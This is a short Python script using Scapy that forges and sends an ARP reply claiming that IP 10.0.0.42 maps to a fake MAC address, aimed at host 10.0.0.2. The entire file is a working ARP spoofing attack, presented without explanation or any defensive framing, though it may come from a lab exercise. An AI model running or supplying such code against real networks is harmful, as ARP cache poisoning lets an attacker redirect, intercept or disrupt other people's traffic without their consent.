from scapy.all import ARP, send

target_ip = "10.0.0.2"
fake_ip = "10.0.0.42"
fake_mac = "42:42:42:42:42:42"

packet = ARP(op=2, pdst=target_ip, psrc=fake_ip, hwsrc=fake_mac)
send(packet)
